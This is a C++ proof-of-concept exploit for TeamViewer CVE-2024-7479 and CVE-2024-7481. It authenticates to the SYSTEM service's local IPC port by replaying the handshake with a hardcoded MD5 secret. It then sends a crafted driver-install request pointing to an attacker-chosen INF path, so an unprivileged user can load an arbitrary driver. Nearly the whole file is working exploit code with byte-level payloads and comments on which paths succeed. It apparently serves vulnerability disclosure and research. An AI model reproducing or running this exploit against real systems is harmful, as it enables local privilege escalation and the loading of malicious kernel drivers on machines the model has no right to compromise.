/*
* Peter Gabaldon - https://pgj11.com/ - https://github.com/PeterGabaldon
* TeamViewer CVE-2024-7479 and CVE-2024-7481 PoC
*/

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>

#include "Hexdump.hpp"
#include "MD5.hpp"
#include "TV_IPC_MSG.hpp"

#pragma comment(lib, "ws2_32.lib")

#define SERVER "127.0.0.1"
#define PORT 5939

// By default TeamViewer SYSTEM service listens on 5939 for IPC. Winsock + IoCompletionPort
/*
* C:\Windows\system32>netstat -ano | findstr /i 15792
  TCP    127.0.0.1:5939         0.0.0.0:0              LISTENING       15792
  TCP    127.0.0.1:5939         127.0.0.1:64668        ESTABLISHED     15792
  [...]
*/

int main() {
    WSABUF dataBuf;
    DWORD sendBytes;
    DWORD flags = 0;
    WSADATA wsaData;
    u_long mode;
    char recvBuf[1024];
    DWORD recvBytes;
    ZeroMemory(recvBuf, 1024);
    fd_set readfds;
    struct timeval tv;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed with error: " << WSAGetLastError() << std::endl;
        return 1;
    }

    SOCKET connectSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL);
    if (connectSocket == INVALID_SOCKET) {
        std::cerr << "WSASocket failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER, &serverAddr.sin_addr);

    if (connect(connectSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connect to socket failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }

    if (setsockopt(connectSocket, SOL_SOCKET, SO_DONTROUTE | 28672, NULL, 0) == SOCKET_ERROR) {
        std::cerr << "Set Socket Pptions Failed: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }
    /*
    * First of all the client send a challenge to server IPC, i.e, TeamViewer_service.exe
    * The IPC server calculates the response hashing (MD5) the 16 bytes send by the client concatenated with 43 6E 67 62 F2 5E A8 D7 04 E5 22 BF A5 5D A1 6A
    * TeamViewer client can use it to verify that is connecting to a real TeamViewer_service IPC. Actually, we do not care about that, we always send the same challenge and do not check the response
    */
    IPC_CLIENTE_CHALLENGE_AUTH ipcClientAuth1 = { { 0x08,0x00,0x01,0x00,0x1d,0x00,0x00,0x00,0x2d,0x02,0x09,0x10,0x00,0x00,0x00 }, {0xb7,0x48,0x77,0x26,0x8a,0x72,0xb8,0xf0,0xfe,0x57,0x04,0x03,0xfc,0x64,0x2e,0xb0}, {0xfe,0x01,0x00,0x00,0x00,0x01} };
    dataBuf.len = (ULONG)sizeof(ipcClientAuth1);
    dataBuf.buf = (char*)&ipcClientAuth1;

    if (WSASend(connectSocket, &dataBuf, 1, &sendBytes, flags, NULL, NULL) == SOCKET_ERROR) {
        std::cerr << "WSASend failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }    

    ZeroMemory(recvBuf, 1024);
    dataBuf.len = 1024;
    dataBuf.buf = recvBuf;

    if (WSARecv(connectSocket, &dataBuf, 1, &recvBytes, &flags, NULL, NULL) == SOCKET_ERROR) {
        std::cerr << "WSARecv failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }    

    std::cout << "Received response from server: " << std::endl << Hexdump(recvBuf, recvBytes) << std::endl;

    /*
    * Now the server sends its challenge, that we need to calculate the valid response and the response to our first challenge. We do not check if its response is valid.
    * In order to calculate the valid response, we need to hash (MD5) the challenge sent by the server concatenated with 40 C2 89 05 3B E8 C1 69 7D 74 D8 36 FC 1D 2F 6E
    */

    IPC_SERVER_CHALLENGE_AUTH ipcServerResponse = {};
    memcpy(ipcServerResponse.header, recvBuf, sizeof(ipcServerResponse.header));
    memcpy(ipcServerResponse.challenge, recvBuf + sizeof(ipcServerResponse.header), sizeof(ipcServerResponse.challenge));
    memcpy(ipcServerResponse.separator, recvBuf + sizeof(ipcServerResponse.header) + sizeof(ipcServerResponse.challenge), sizeof(ipcServerResponse.separator));
    memcpy(ipcServerResponse.client_challenge_response, recvBuf + sizeof(ipcServerResponse.header) + sizeof(ipcServerResponse.challenge) + sizeof(ipcServerResponse.separator), sizeof(ipcServerResponse.client_challenge_response));
    memcpy(ipcServerResponse.tail, recvBuf + sizeof(ipcServerResponse.header) + sizeof(ipcServerResponse.challenge) + sizeof(ipcServerResponse.separator) + sizeof(ipcServerResponse.client_challenge_response), sizeof(ipcServerResponse.tail));

    // TV concatenates this SECRET to the server challenge. Then MD5 it.
    char secret[16] = { 0x40, 0xc2, 0x89, 0x05, 0x3b, 0xe8, 0xc1, 0x69, 0x7d, 0x74, 0xd8, 0x36, 0xfc, 0x1d, 0x2f, 0x6e };
    unsigned char toMD5[32] = {};
    unsigned char output[16] = {};
    memcpy(toMD5, ipcServerResponse.challenge, sizeof(ipcServerResponse.challenge));
    memcpy(toMD5 + sizeof(ipcServerResponse.challenge), secret, sizeof(secret));
    MD5Hash(toMD5, sizeof(toMD5), output);

    std::cout << "To Hash (MD5): " << std::endl << Hexdump(toMD5, 32) << std::endl;
    std::cout << "Response calculated (MD5): " << std::endl << Hexdump(output, 16) << std::endl;

    IPC_CLIENTE_CHALLENGE_AUTH ipcClientAuth2 = { {0x08,0x00,0x01,0x00,0x1d,0x00,0x00,0x00,0x2d,0x02,0x0a,0x10,0x00,0x00,0x00}, {}, {0xfe,0x01,0x00,0x00,0x00,0x01} };
    memcpy(ipcClientAuth2.challenge, output, sizeof(output));
    dataBuf.len = (ULONG)sizeof(ipcClientAuth2);
    dataBuf.buf = (char*)&ipcClientAuth2;

    if (WSASend(connectSocket, &dataBuf, 1, &sendBytes, flags, NULL, NULL) == SOCKET_ERROR) {
        std::cerr << "WSASend failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }

    /*
    * After the authentication completes succesfully the servers expects a "Control Message" that basically contains the PID of the client process connecting to the IPC and the TeamViewer version.
    */
    DWORD PID = GetCurrentProcessId();

    // Adjust TeamViewer target version
    WCHAR VERSION[] = L"15.58.4";
    WCHAR VERSION_MAJOR[] = L"15";
    WCHAR VERSION_MID[] = L"58";
    WCHAR VERSION_MINOR[] = L"4";

    IPC_CONTROL_IPC controlIPC = { {0x08,0x00,0x01,0x00,0xac,0x00,0x00,0x00,0x01,0x12,0x01,0x04,0x00,0x00,0x00}, {},  {0x02,0x04,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x03,0x01,0x00,0x00,0x00,0x00,0x04,0x12,0x00,0x00,0x00}, {}, {0x00, 0x20,0x00,0x00,0x00,0x05,0x04,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x06,0x06,0x00,0x00,0x00,0x65,0x00,0x6e,0x00,0x00,0x00,0x07,0x01,0x00,0x00,0x00,0x00,0x09,0x06,0x00,0x00,0x00,0x31,0x00,0x35,0x00,0x00,0x00,0x0a,0x06,0x00,0x00,0x00,0x35,0x00,0x35,0x00,0x00,0x00,0x0b,0x04,0x00,0x00,0x00,0x33,0x00,0x00,0x00,0x0d,0x01,0x00,0x00,0x00,0x01,0x0e,0x04,0x00,0x00,0x00,0xdd,0x7b,0xa7,0x37,0x0f,0x04,0x00,0x00,0x00,0x1d,0xbf,0x52,0x39,0x11,0x04,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0xf3,0x04,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0xfd,0x04,0x00,0x00,0x00,0xfd,0xcf,0xff,0x02,0xfe,0x01,0x00,0x00,0x00,0x01,0xff,0x04,0x00,0x00,0x00,0x8c}, {0x83, 0x14, 0x3b}
};
    memcpy(&controlIPC.PID, &PID, sizeof(DWORD));

    // We do not copy the null byte
    memcpy(&controlIPC.version, VERSION, sizeof(VERSION)-2);

    memcpy(controlIPC.post_body + 0x24, VERSION_MAJOR, sizeof(VERSION_MAJOR));
    memcpy(controlIPC.post_body + 0x2f, VERSION_MID, sizeof(VERSION_MID));
    memcpy(controlIPC.post_body + 0x3a, VERSION_MINOR, sizeof(VERSION_MINOR));

    dataBuf.len = (ULONG)180;
    dataBuf.buf = (char*)&controlIPC;

    std::cout << "CONTROL_IPC to send: " << std::endl << Hexdump(dataBuf.buf, dataBuf.len) << std::endl;

    if (WSASend(connectSocket, &dataBuf, 1, &sendBytes, flags, NULL, NULL) == SOCKET_ERROR) {
        std::cerr << "WSASend failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }
    
    /*
    * Now the server sends multiple commands for sync configuration. We read it all, but no necessary to do anything with that information.
    */
    // Make the socket non-blocking
    mode = 1;  // 1 to enable non-blocking socket
    if (ioctlsocket(connectSocket, FIONBIO, &mode) != NO_ERROR) {
        std::cerr << "ioctlsocket failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }

    while (true) {
        FD_ZERO(&readfds);
        FD_SET(connectSocket, &readfds);

        // Set timeout (optional)
        tv.tv_sec = 1;  // 1 second timeout
        tv.tv_usec = 0;

        int selectResult = select(0, &readfds, NULL, NULL, &tv);
        if (selectResult > 0) {
            if (FD_ISSET(connectSocket, &readfds)) {
                ZeroMemory(recvBuf, 1024);
                dataBuf.len = 1024;
                dataBuf.buf = recvBuf;

                int recvResult = WSARecv(connectSocket, &dataBuf, 1, (LPDWORD)&recvBytes, &flags, NULL, NULL);
                if (recvResult == SOCKET_ERROR) {
                    int error = WSAGetLastError();
                    if (error == WSAEWOULDBLOCK) {
                        // No data available, continue loop
                        continue;
                    }
                    else if (error == WSAECONNRESET) {
                        std::cerr << "Connection closed by server." << std::endl;
                        break;
                    }
                    else {
                        std::cerr << "WSARecv failed with error: " << error << std::endl;
                        closesocket(connectSocket);
                        WSACleanup();
                        return 1;
                    }
                }

                if (recvBytes == 0) {
                    std::cout << "Connection closed by server." << std::endl;
                    break;
                }

                //std::cout << "Received from server sync configuration info (not showing hexdump): " << std::endl << std::endl;
            }
        }
        else if (selectResult == 0) {
            // Timeout, all data read.
            break;
        }
        else {
            std::cerr << "select failed with error: " << WSAGetLastError() << std::endl;
            closesocket(connectSocket);
            WSACleanup();
            return 1;
        }
    }

    // Make the socket blocking again :)
    mode = 0;  // 1 to enable non-blocking socket
    if (ioctlsocket(connectSocket, FIONBIO, &mode) != NO_ERROR) {
        std::cerr << "ioctlsocket failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }

    /*
    * Now the magic message, which request the service to install the VPN Driver. The INF file is arbitrary send by the client, so we can specify an arbitary path (INF file)
    * that eventually TeamViewer_service and its helper program will finish calling UpdateDriverForPlugAndPlayDevicesA(...) with our arbitary INF.
    * I have not found a way to install an arbitary service using the INF becauase UpdateDriverForPlugAndPlayDevicesA updates the driver for an existant Hardware and cannot install a service.
    * Using an INF that creates a service will make UpdateDriverForPlugAndPlayDevicesA fail with error code 259, so we need to install an arbitary driver.
    * Also it is possible to use the original INF and cat file and rename an arbitary driver "teamviewervpv.sys" and it will be loaded on to the system.
    *   0000   08 00 01 00 35 01 00 00 33 0c 01 01 00 00 00 01   ....5...3.......
        0010   02 04 00 00 00 02 00 00 00 03 96 00 00 00 2d 00   ..............-.
        0020   2d 00 69 00 6e 00 66 00 20 00 43 00 3a 00 5c 00   -.i.n.f. .C.:.\.
        0030   4e 00 6f 00 74 00 20 00 50 00 72 00 6f 00 67 00   N.o.t. .P.r.o.g.
        0040   72 00 61 00 6d 00 20 00 46 00 5c 00 61 00 61 00   r.a.m. .F.\.a.a.
        0050   61 00 61 00 61 00 61 00 61 00 61 00 61 00 61 00   a.a.a.a.a.a.a.a.
        0060   5c 00 62 00 62 00 62 00 5c 00 41 00 6e 00 6f 00   \.b.b.b.\.A.n.o.
        0070   74 00 68 00 65 00 72 00 54 00 68 00 69 00 6e 00   t.h.e.r.T.h.i.n.
        0080   67 00 67 00 2e 00 69 00 6e 00 66 00 20 00 2d 00   g.g...i.n.f. .-.
        0090   2d 00 69 00 64 00 20 00 54 00 45 00 41 00 4d 00   -.i.d. .T.E.A.M.
        00a0   56 00 49 00 45 00 57 00 45 00 52 00 56 00 50 00   V.I.E.W.E.R.V.P.
        00b0   4e 00 00 00 05 02 00 00 00 00 00 06 02 00 00 00   N...............
        00c0   00 00 07 01 00 00 00 00 08 46 00 00 00 4c 00 6f   .........F...L.o
        00d0   00 63 00 61 00 6c 00 5c 00 44 00 72 00 69 00 76   .c.a.l.\.D.r.i.v
        00e0   00 65 00 72 00 49 00 6e 00 73 00 74 00 61 00 6c   .e.r.I.n.s.t.a.l
        00f0   00 6c 00 46 00 69 00 6e 00 69 00 73 00 68 00 45   .l.F.i.n.i.s.h.E
        0100   00 76 00 65 00 6e 00 74 00 5f 00 56 00 50 00 4e   .v.e.n.t._.V.P.N
        0110   00 00 00 09 04 00 00 00 00 00 00 00 f3 04 00 00   ................
        0120   00 02 00 00 00 fd 04 00 00 00 01 00 00 00 fe 01   ................
        0130   00 00 00 01 ff 04 00 00 00 95 d4 04 31            ............1
    */
    IPC_SEND_DRIVER_INSTALL_REQ ipcSendInstallVPNDriver = { {0x08, 0x00, 0x01, 0x00},
                                                            {},
                                                            {0x33, 0x0c, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01,
                                                                0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x96, 0x00, 0x00, 0x00
                                                            },
                                                            {0x20, 0x00, 0x2d, 0x00,
                                                                0x2d, 0x00, 0x69, 0x00, 0x64, 0x00, 0x20, 0x00, 0x54, 0x00, 0x45, 0x00, 0x41, 0x00, 0x4d, 0x00,
                                                                0x56, 0x00, 0x49, 0x00, 0x45, 0x00, 0x57, 0x00, 0x45, 0x00, 0x52, 0x00, 0x56, 0x00, 0x50, 0x00,
                                                                0x4e, 0x00, 0x00, 0x00, 0x05, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x02, 0x00, 0x00, 0x00,
                                                                0x00, 0x00, 0x07, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x46, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x6f,
                                                                0x00, 0x63, 0x00, 0x61, 0x00, 0x6c, 0x00, 0x5c, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76,
                                                                0x00, 0x65, 0x00, 0x72, 0x00, 0x49, 0x00, 0x6e, 0x00, 0x73, 0x00, 0x74, 0x00, 0x61, 0x00, 0x6c,
                                                                0x00, 0x6c, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x69, 0x00, 0x73, 0x00, 0x68, 0x00, 0x45,
                                                                0x00, 0x76, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x5f, 0x00, 0x56, 0x00, 0x50, 0x00, 0x4e,
                                                                0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf3, 0x04, 0x00, 0x00,
                                                                0x00, 0x02, 0x00, 0x00, 0x00, 0xfd, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xfe, 0x01,
                                                                0x00, 0x00, 0x00, 0x01, 0xff, 0x04, 0x00, 0x00, 0x00, 0x95, 0xd4, 0x04, 0x31
                                                            }
    };
    
    // Path of fake INF
    // Do not ask me why, but some paths works and another not, I then tried using paths with the same length as the original. Here is one that works (that can be created by an unprivileged user). Testing, deleting last 'g' worked. But adding another 'g' to the filename does not work. Strange but I did not studied the root cause. :)))
    WCHAR path[] = L"--inf C:\\Not Program F\\aaaaaaaaaa\\bbb\\AnotherThingg.inf";

    // The first 4 bytes are the header, the next 4 bytes is the lenght of the full IPC msg minus the 8 bytes of the header and minus the 2 bytes of the wide null byte of the string.
    DWORD sizeMsg = sizeof(ipcSendInstallVPNDriver) + sizeof(path) - 2 - 8;
    unsigned char requestDriverInstall[sizeof(ipcSendInstallVPNDriver) + sizeof(path) - 2] = {};

    memcpy(requestDriverInstall, ipcSendInstallVPNDriver.header, sizeof(ipcSendInstallVPNDriver.header));
    memcpy(requestDriverInstall + sizeof(ipcSendInstallVPNDriver.header), &sizeMsg, sizeof(sizeMsg));
    memcpy(requestDriverInstall + sizeof(ipcSendInstallVPNDriver.header) + sizeof(sizeMsg), ipcSendInstallVPNDriver.rest_header, sizeof(ipcSendInstallVPNDriver.rest_header));
    // WE NEED TO NOT COPY THE NULL BYTE BECAUSE THE STRING IS NOT NULL-TERMINATED IN THE IPC MSG. This has changed in the new fixing version and now it is null-terminated.
    memcpy(requestDriverInstall + sizeof(ipcSendInstallVPNDriver.header) + sizeof(sizeMsg) + sizeof(ipcSendInstallVPNDriver.rest_header), path, sizeof(path)-2);
    memcpy(requestDriverInstall + sizeof(ipcSendInstallVPNDriver.header) + sizeof(sizeMsg) + sizeof(ipcSendInstallVPNDriver.rest_header) + sizeof(path)-2, ipcSendInstallVPNDriver.restOfStringandTail, sizeof(ipcSendInstallVPNDriver.restOfStringandTail));
    
    /*
    // Original one that installs real VPN driver of TV with path modified directly in the hex array.    
    // Installing C:\Not Program F\aaaaaaaaaa\bbb\AnotherThingg.inf (49 chars)
    unsigned char requestDriverInstall[] = {
                                            0x08, 0x00, 0x01, 0x00, 0x35, 0x01, 0x00, 0x00, 0x33, 0x0c, 0x01, 0x01, 0x00, 0x00, 0x00, 0x01,
                                            0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x96, 0x00, 0x00, 0x00, 0x2d, 0x00,
                                            0x2d, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x66, 0x00, 0x20, 0x00, 0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00,
                                            0x4E, 0x00, 0x6F, 0x00, 0x74, 0x00, 0x20, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x67, 0x00,
                                            0x72, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x20, 0x00, 0x46, 0x00, 0x5C, 0x00, 0x61, 0x00, 0x61, 0x00,
                                            0x61, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00,
                                            0x5C, 0x00, 0x62, 0x00, 0x62, 0x00, 0x62, 0x00, 0x5C, 0x00, 0x41, 0x00, 0x6E, 0x00, 0x6F, 0x00,
                                            0x74, 0x00, 0x68, 0x00, 0x65, 0x00, 0x72, 0x00, 0x54, 0x00, 0x68, 0x00, 0x69, 0x00, 0x6E, 0x00,
                                            0x67, 0x00, 0x67, 0x00, 0x2E, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x20, 0x00, 0x2d, 0x00,
                                            0x2d, 0x00, 0x69, 0x00, 0x64, 0x00, 0x20, 0x00, 0x54, 0x00, 0x45, 0x00, 0x41, 0x00, 0x4d, 0x00,
                                            0x56, 0x00, 0x49, 0x00, 0x45, 0x00, 0x57, 0x00, 0x45, 0x00, 0x52, 0x00, 0x56, 0x00, 0x50, 0x00,
                                            0x4e, 0x00, 0x00, 0x00, 0x05, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x02, 0x00, 0x00, 0x00,
                                            0x00, 0x00, 0x07, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x46, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x6f,
                                            0x00, 0x63, 0x00, 0x61, 0x00, 0x6c, 0x00, 0x5c, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76,
                                            0x00, 0x65, 0x00, 0x72, 0x00, 0x49, 0x00, 0x6e, 0x00, 0x73, 0x00, 0x74, 0x00, 0x61, 0x00, 0x6c,
                                            0x00, 0x6c, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x69, 0x00, 0x73, 0x00, 0x68, 0x00, 0x45,
                                            0x00, 0x76, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x5f, 0x00, 0x56, 0x00, 0x50, 0x00, 0x4e,
                                            0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf3, 0x04, 0x00, 0x00,
                                            0x00, 0x02, 0x00, 0x00, 0x00, 0xfd, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xfe, 0x01,
                                            0x00, 0x00, 0x00, 0x01, 0xff, 0x04, 0x00, 0x00, 0x00, 0x95, 0xd4, 0x04, 0x31
                                            };
    */
    
    dataBuf.len = (ULONG)sizeof(requestDriverInstall);
    dataBuf.buf = (char*)requestDriverInstall;
    std::cout << "Sending request to install Driver: " << std::endl << Hexdump(dataBuf.buf, dataBuf.len) << std::endl;

    if (WSASend(connectSocket, &dataBuf, 1, &sendBytes, flags, NULL, NULL) == SOCKET_ERROR) {
        std::cerr << "WSASend failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return 1;
    }

    closesocket(connectSocket);
    WSACleanup();
    return 0;
}
